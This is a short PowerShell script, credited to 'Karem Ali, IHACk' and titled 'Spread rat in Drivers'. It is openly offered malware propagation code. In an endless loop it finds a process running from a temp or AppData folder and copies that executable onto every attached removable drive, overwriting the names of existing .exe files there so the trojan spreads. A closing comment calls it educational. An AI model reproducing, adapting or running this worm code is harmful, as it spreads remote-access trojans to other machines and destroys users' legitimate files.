#Spread rat in Drivers
#Owned by Karem Ali , IHACk
while(1){
$P = get-process  | Get-ChildItem | select @{n='name'; e={$_.basename}} , directory | where{$_.directory  -like "*temp*" –or $_.directory -like "*appdata*"} | Select -ExpandProperty name -First 1
$h= ":"
set-location f:
$l = Get-Volume | where{$_.DriveType -like "Removable" } | Select -ExpandProperty Driveletter 
$A = Get-ChildItem $l$h\*\*| Where{$_.Name -like "*.exe*"} | select -ExpandProperty name -First 1 
$C , $D , $K , $R = Get-ChildItem $l$h -Directory | select -ExpandProperty name -First 4
$E  , $F , $G = Get-ChildItem $l$h | where{$_.Name -like "*.exe*"} | Select -ExpandProperty name -First 3
Set-Location C:\Users\$env:username
Set-Location AppData\Roaming
copy $P $l$h\$C\$A
copy $P $l$h\$D\$A 
copy $P $l$h\$K\$A
copy $P $l$h\$R\$A 
copy $P $l$h\$F  
copy $P $l$h\$G
copy $P E:\$E
}
#Just For Educating , Don't use it badly